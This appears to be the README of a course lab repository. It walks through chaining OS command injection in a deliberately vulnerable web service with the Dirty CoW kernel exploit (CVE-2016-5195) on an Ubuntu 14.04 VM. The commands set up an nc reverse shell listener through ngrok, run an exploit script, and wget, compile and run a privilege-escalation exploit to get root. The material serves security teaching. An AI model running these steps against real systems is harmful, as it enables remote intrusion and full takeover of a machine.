## Topic

Bug chain of OS Command Injection to Dirty CoW ([CVE-2016-5195](https://nvd.nist.gov/vuln/detail/cve-2016-5195)) on Linux 3.13.0-170-generic kernel (Ubuntu 14.04.02 Trusty Tahr)

## Setup 

1. Using Virtualbox/VMWare/any virtualization, with amd64/i386 image of [Ubuntu 14.04.02](http://old-releases.ubuntu.com/releases/14.04.0/)
2. (Optional but highly recommended) Install a higher version of Python3 (3.7+). Follow this [guide](https://github.com/actions/setup-python/issues/93).
3. Clone this repository

```bash
git clone https://github.com/h114mx001/COMP2040-LinuxKernelVulns
```
4. Run the web service
```bash
cd COMP2040-LinuxKernelVuln
python3 ./main.py
```
5. Assert the service is accessible from outside of the VM.

## Attack

1. Setup reverse shell listener on the host machine 
```bash
ngrok tcp 4444 
# in another terminal
nc -lvnp 4444
```
2. Run the exploit script, with updated IP address of the ngrok server
```bash
python3 ./exploit.py
``` 
3. Access the web service from the VM, and observe the reverse shell on the host machine by sending the payload generated by the exploit script.
4. Install the dirtycow exploit on the VM 
```bash 
wget https://raw.githubusercontent.com/h114mx001/COMP2040-LinuxKernelVulns/main/dirtycow_privesc.c
gcc -pthread dirtycow_privesc.c -o dirtycow -lcrypt
./dirtycow
```
5. Have fun with the root shell :) 
```bash 
su root
```

Recommended steps: You should split the terminal using `tmux`, when receives the reverse shell. Also reverse shell hardening techniques are recommended.
